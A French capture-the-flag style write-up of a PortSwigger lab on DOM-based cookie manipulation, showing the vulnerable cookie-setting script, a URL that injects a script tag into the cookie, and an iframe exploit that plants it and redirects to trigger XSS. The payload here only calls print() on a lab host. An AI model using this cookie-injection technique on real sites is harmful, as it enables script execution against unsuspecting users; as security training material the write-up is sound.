# Lab

https://portswigger.net/web-security/dom-based/cookie-manipulation/lab-dom-cookie-manipulation

## Solution

Dans la page de détails d'un produit, il y a ce script :

```html
<script>
    document.cookie = 'lastViewedProduct=' + window.location + '; SameSite=None; Secure'
</script>
```

Ensuite, cette valeur est reprise pour afficher un lien qui mène vers le dernier article consulté :

```html
<a href='https://0aec00bd047fa0f981dcf2770086006a.web-security-academy.net/product?productId=1'>Last viewed product</a>
```

On peut injecter via l'URL un cookie qui contient de l'HTML :

`https://0aec00bd047fa0f981dcf2770086006a.web-security-academy.net/product?productId=1&'><script>print()</script>`

Ainsi, si on viste ce lien et qu'on se rend sur une autre page, on a un pop-up d'impression qui s'affiche.

On a plus qu'a faire un exploit qui va générer le cookie contenant la XSS et qui redirige vers une autre page pour executer le payload :

```html
<iframe src="https://0aec00bd047fa0f981dcf2770086006a.web-security-academy.net/product?productId=1&%27%3E%3Cscript%3Eprint()%3C/script%3E" onload="this.src='https://0aec00bd047fa0f981dcf2770086006a.web-security-academy.net/'"></iframe>
```